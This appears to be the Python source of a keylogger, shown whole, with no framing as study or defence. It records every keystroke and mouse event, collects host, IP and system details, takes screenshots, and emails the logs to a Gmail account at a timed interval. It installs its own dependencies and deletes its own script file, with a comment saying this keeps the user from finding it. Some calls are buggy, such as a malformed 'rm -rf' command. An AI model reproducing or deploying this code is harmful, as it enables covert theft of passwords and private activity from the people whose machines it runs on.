try:
    # try importing the dependencies
    import os
    import socket
    import platform
    import threading
    import smtplib
    import logging
    import pyscreenshot
    from pynput import keyboard
    from pynput.keyboard import Listener
    import config as cfg

    # TODO: sound didn't work well
    # import sounddevice as sd
    # import wave
except ModuleNotFoundError:
    # install the missing dependencies
    from subprocess import call

    # TODO: sound didn't work well
    # modules = ["pyscreenshot", "sounddevice", "pynput"]

    modules = ["pyscreenshot", "pynput"]
    deps = " ".join(modules)
    install_cmd = f"pip install {deps}"

    call(install_cmd, shell=True)
finally:

    class KeyLogger:
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = "KeyLogger initiated..."
            self.email = email
            self.password = password

        def append_log(self, msg):
            self.log = "".join((self.log, msg))

        def on_move(self, x, y):
            current_move = logging.info(f"Mouse moved to {x} {y}")
            self.append_log(current_move)

        def on_click(self, x, y):
            current_click = logging.info(f"Mouse moved to {x} {y}")
            self.append_log(current_click)

        def on_scroll(self, x, y):
            current_scroll = logging.info(f"Mouse moved to {x} {y}")
            self.append_log(current_scroll)

        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                # when dealing with control or non printable characters
                if key == key.space:
                    current_key = "SPACE"
                elif key == key.esc:
                    current_key = "ESC"
                else:
                    current_key = f" {str(key)} "
            self.append_log(current_key)

        def send_mail(self, email, password, message):
            with smtplib.SMTP(host="smtp.gmail.com", port=587) as server:
                server.starttls()
                server.login(email, password)
                server.sendmail(email, email, message)

        def report(self):
            msg = f"\n\n{self.log}"
            self.send_mail(self.email, self.password, message=msg)
            self.log = ""
            timer = threading.Timer(self.interval, self.report)
            timer.start()

        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            self.append_log(hostname)
            self.append_log(ip)
            self.append_log(plat)
            self.append_log(system)
            self.append_log(machine)

        def screenshot(self):
            img = pyscreenshot.grab()
            self.send_mail(
                email=cfg.EMAIL_ADDRESS, password=cfg.EMAIL_PASSWORD, message=img
            )

        def run(self):
            # capture keyboard events
            keyboard_listener = keyboard.Listener(on_press=self.save_data)
            with keyboard_listener:
                self.report()
                keyboard_listener.join()

            # capture mouse events too
            with Listener(
                on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll
            ) as mouse_listener:
                mouse_listener.join()

            if os.name == "nt":  # windows-specific
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system(f"cd {pwd}")
                    os.system(f"TASKKILL /F /IM {os.path.basename(__file__)}")
                    os.system(f"DEL {os.path.basename(__file__)}")
                except OSError:
                    print("File is closed.")
            else:  # unix-specific
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system(f"cd {pwd}")

                    # remove the immutable attribute if it's set
                    os.system(f"chattr -i {os.path.basename(__file__)}")

                    # remove the current script from the system to prevent the user from
                    # finding it hence leaving it in the memory only
                    os.system("rm -rf" + os.path.basename(__file__))
                except OSError:
                    print("File is closed.")

        # TODO: didn't work well
        # def microphone(self):
        #     fs = 44100
        #     seconds = cfg.SEND_REPORT_EVERY
        #     obj = wave.open("sound.wav", "w")
        #     obj.setnchannels(1)  # mono
        #     obj.setsampwidth(2)
        #     obj.setframerate(fs)
        #     myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        #     obj.writeframesraw(myrecording)
        #     sd.wait()

        #     self.send_mail(
        #         email=cfg.EMAIL_ADDRESS, password=cfg.EMAIL_PASSWORD, message=obj
        #     )
